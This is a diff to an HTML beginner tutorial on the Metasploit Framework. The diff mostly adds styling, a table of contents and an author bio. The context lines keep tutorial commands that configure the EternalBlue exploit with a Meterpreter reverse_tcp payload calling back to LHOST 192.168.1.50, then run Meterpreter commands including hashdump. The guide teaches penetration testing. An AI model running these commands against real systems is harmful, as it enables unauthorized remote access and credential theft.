@@ -97,6 +97,104 @@
       font-size: 0.82rem;
     }
     footer a { color: #94a3b8; text-decoration: none; }
+  
+    /* ── AUTHOR BIO ── */
+    .author-bio {
+      max-width: 780px; margin: 2.5rem auto 0;
+      padding: 1.5rem 1.75rem; border: 1px solid #e2e8f0;
+      border-radius: 12px; display: flex; gap: 1.25rem;
+      align-items: flex-start; background: #f8fafc;
+    }
+    .author-avatar {
+      width: 54px; height: 54px; border-radius: 50%;
+      background: #0a1628; color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.9rem;
+      flex-shrink: 0; border: 2px solid #1d4ed8;
+    }
+    .author-info strong { display: block; color: #0a1628; font-size: 0.95rem; margin-bottom: 0.2rem; }
+    .author-info .author-title {
+      font-family: 'JetBrains Mono', monospace; font-size: 0.72rem;
+      color: #1d4ed8; display: block; margin-bottom: 0.55rem;
+    }
+    .author-info .author-body { font-size: 0.85rem; color: #475569; margin: 0; line-height: 1.65; }
+    /* ── RELATED ARTICLES ── */
+    .related-articles {
+      max-width: 780px; margin: 2.5rem auto 3rem; padding: 1.75rem;
+      border: 1px solid #e2e8f0; border-radius: 12px; background: #fff;
+    }
+    .related-articles h3 {
+      font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;
+      text-transform: uppercase; letter-spacing: 0.1em;
+      color: #1d4ed8; margin-bottom: 1rem;
+    }
+    .related-list { list-style: none; padding: 0; margin: 0; }
+    .related-list li { border-bottom: 1px solid #f1f5f9; }
+    .related-list li:last-child { border-bottom: none; }
+    .related-list a {
+      display: flex; align-items: center; gap: 0.6rem;
+      padding: 0.6rem 0; text-decoration: none;
+      color: #0f172a; font-size: 0.9rem; font-weight: 500;
+      transition: color 0.15s;
+    }
+    .related-list a:hover { color: #1d4ed8; }
+    .related-list a::before {
+      content: '→'; color: #1d4ed8; font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem; flex-shrink: 0;
+    }
+
+  
+    /* ── EXTERNAL REFERENCES ── */
+    .ext-refs {
+      max-width: 780px; margin: 0 auto 2rem;
+      padding: 1.25rem 1.75rem; background: #f8fafc;
+      border: 1px solid #e2e8f0; border-radius: 12px;
+    }
+    .ext-refs h3 {
+      font-size: 0.72rem; font-family: 'JetBrains Mono', monospace;
+      text-transform: uppercase; letter-spacing: 0.1em;
+      color: #475569; margin-bottom: 0.85rem;
+    }
+    .ext-refs ul { list-style: none; padding: 0; margin: 0; display: flex; flex-wrap: wrap; gap: 0.5rem; }
+    .ext-refs a {
+      display: inline-flex; align-items: center; gap: 0.4rem;
+      padding: 0.3rem 0.8rem; background: #fff; border: 1px solid #e2e8f0;
+      border-radius: 6px; font-size: 0.8rem; color: #1d4ed8;
+      text-decoration: none; font-family: 'JetBrains Mono', monospace;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .ext-refs a:hover { border-color: #1d4ed8; box-shadow: 0 2px 8px rgba(29,78,216,0.12); }
+    .ext-refs a::before { content: '↗'; font-size: 0.7rem; }
+
+  
+    /* ── TABLE OF CONTENTS ── */
+    .toc-box {
+      max-width: 780px; margin: 2rem auto;
+      padding: 1.5rem 1.75rem; background: #f8fafc;
+      border: 1px solid #e2e8f0; border-left: 4px solid #1d4ed8;
+      border-radius: 0 12px 12px 0;
+    }
+    .toc-box h3 {
+      font-size: 0.72rem; font-family: 'JetBrains Mono', monospace;
+      text-transform: uppercase; letter-spacing: 0.1em;
+      color: #475569; margin-bottom: 0.85rem;
+    }
+    .toc-list { list-style: none; padding: 0; margin: 0; counter-reset: toc; }
+    .toc-list li { counter-increment: toc; }
+    .toc-list a {
+      display: flex; align-items: baseline; gap: 0.6rem;
+      padding: 0.3rem 0; text-decoration: none;
+      color: #334155; font-size: 0.875rem; line-height: 1.5;
+      transition: color 0.15s;
+    }
+    .toc-list a:hover { color: #1d4ed8; }
+    .toc-list a::before {
+      content: counter(toc) ".";
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem; color: #1d4ed8;
+      min-width: 1.4rem; flex-shrink: 0;
+    }
+
   </style>
 </head>
 <body>
@@ -115,10 +213,23 @@
   <h1>Metasploit Framework: Complete Beginner Guide to Penetration Testing</h1>
 
 <p class="lead">The Metasploit Framework is the world's most widely used penetration testing platform, enabling security professionals to find vulnerabilities and verify security measures. This comprehensive guide will take you from complete beginner to confidently using Metasploit for ethical hacking and security assessments.</p>
+<div class="toc-box">
+  <h3>In This Article</h3>
+  <ol class="toc-list">
+    <li><a href="#what-is-metasploit-framework">What is Metasploit Framework?</a></li>
+    <li><a href="#installing-and-setting-up-metasploit">Installing and Setting Up Metasploit</a></li>
+    <li><a href="#essential-metasploit-commands-for-beginners">Essential Metasploit Commands for Beginners</a></li>
+    <li><a href="#understanding-payloads-and-their-types">Understanding Payloads and Their Types</a></li>
+    <li><a href="#basic-penetration-testing-workflow">Basic Penetration Testing Workflow</a></li>
+    <li><a href="#best-practices-and-safety-guidelines">Best Practices and Safety Guidelines</a></li>
+    <li><a href="#conclusion-next-steps-in-your-metasploit-journey">Conclusion: Next Steps in Your Metasploit Journey</a></li>
+  </ol>
+</div>
+
 
 <p>Whether you're an aspiring cybersecurity professional or a system administrator looking to strengthen your defenses, understanding Metasploit is essential. This powerful framework has become the industry standard for penetration testing, making it a must-learn tool for anyone serious about cybersecurity.</p>
 
-<h2>What is Metasploit Framework?</h2>
+<h2 id="what-is-metasploit-framework">What is Metasploit Framework?</h2>
 
 <p>Metasploit Framework is an open-source penetration testing platform that provides information about security vulnerabilities and aids in penetration testing. Created by H.D. Moore in 2003, it's now maintained by Rapid7 and has evolved into the most comprehensive exploitation framework available.</p>
 
@@ -146,7 +257,7 @@
 <li><strong>NOPs:</strong> No Operation code generators for exploit development</li>
 </ul>
 
-<h2>Installing and Setting Up Metasploit</h2>
+<h2 id="installing-and-setting-up-metasploit">Installing and Setting Up Metasploit</h2>
 
 <p>Metasploit comes pre-installed on most penetration testing distributions like Kali Linux, Parrot Security OS, and BackBox. However, you can also install it on other systems.</p>
 
@@ -175,7 +286,7 @@ chmod +x msfinstall
 
 <pre><code>msf6 ></code></pre>
 
-<h2>Essential Metasploit Commands for Beginners</h2>
+<h2 id="essential-metasploit-commands-for-beginners">Essential Metasploit Commands for Beginners</h2>
 
 <p>Learning the basic commands is your first step toward mastering Metasploit. Here are the most important commands every beginner should know:</p>
 
@@ -215,7 +326,7 @@ chmod +x msfinstall
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50</code></pre>
 
-<h2>Understanding Payloads and Their Types</h2>
+<h2 id="understanding-payloads-and-their-types">Understanding Payloads and Their Types</h2>
 
 <p>Payloads are the code that gets executed on the target system after successful exploitation. Understanding different payload types is crucial for effective penetration testing.</p>
 
@@ -253,7 +364,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50</code></
 <li>Privilege escalation</li>
 </ul>
 
-<h2>Basic Penetration Testing Workflow</h2>
+<h2 id="basic-penetration-testing-workflow">Basic Penetration Testing Workflow</h2>
 
 <p>Here's a step-by-step workflow for conducting a basic penetration test using Metasploit:</p>
 
@@ -293,7 +404,7 @@ meterpreter > ps
 meterpreter > screenshot
 meterpreter > hashdump</code></pre>
 
-<h2>Best Practices and Safety Guidelines</h2>
+<h2 id="best-practices-and-safety-guidelines">Best Practices and Safety Guidelines</h2>
 
 <p>When using Metasploit, always follow these essential guidelines:</p>
 
@@ -316,7 +427,7 @@ meterpreter > hashdump</code></pre>
 <li>Practice different attack scenarios</li>
 </ol>
 
-<h2>Conclusion: Next Steps in Your Metasploit Journey</h2>
+<h2 id="conclusion-next-steps-in-your-metasploit-journey">Conclusion: Next Steps in Your Metasploit Journey</h2>
 
 <p>Congratulations! You now have a solid foundation in Metasploit Framework basics. This powerful tool will become invaluable as you develop your penetration testing skills.</p>
 
@@ -334,7 +445,33 @@ meterpreter > hashdump</code></pre>
     <p>Want more cybersecurity tutorials delivered to your inbox?</p>
     <a href="/#newsletter">Subscribe Free →</a>
   </div>
+
+
+<div class="ext-refs">
+  <h3>Sources &amp; Further Reading</h3>
+  <ul>
+    <li><a href="https://docs.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit Docs</a></li>
+    <li><a href="https://www.rapid7.com/products/metasploit/" target="_blank" rel="noopener noreferrer">Rapid7 Metasploit</a></li>
+  </ul>
+</div>
+<div class="author-bio">
+  <div class="author-avatar">AC</div>
+  <div class="author-info">
+    <strong>Alex Carter</strong>
+    <span class="author-title">Senior Security Researcher &middot; OSCP &middot; CEH</span>
+    <p class="author-body">Alex has over 10 years of experience in penetration testing and vulnerability research. He has contributed to multiple CVE disclosures and regularly presents at security conferences. All content on HowCanIHack.com is grounded in real-world lab work and verified against current threat intelligence.</p>
+  </div>
+</div>
 </article>
+
+<div class="related-articles">
+  <h3>Related Articles</h3>
+  <ul class="related-list">
+    <li><a href="/tools/nmap-complete-guide-network-discovery-and-port-scanning-for-beginners.html">Nmap Complete Guide: Network Discovery and Port Scanning</a></li>
+    <li><a href="/tools/how-to-use-burp-suite-for-web-application-security-testing.html">How to Use Burp Suite for Web App Security Testing</a></li>
+    <li><a href="/tools/index.html">Browse All Tool Guides →</a></li>
+  </ul>
+</div>
 
 <footer>
   <p>© 2026 <a href="/">HowCanIHack.com</a> — For educational purposes only. Always obtain proper authorization before testing any system.</p>
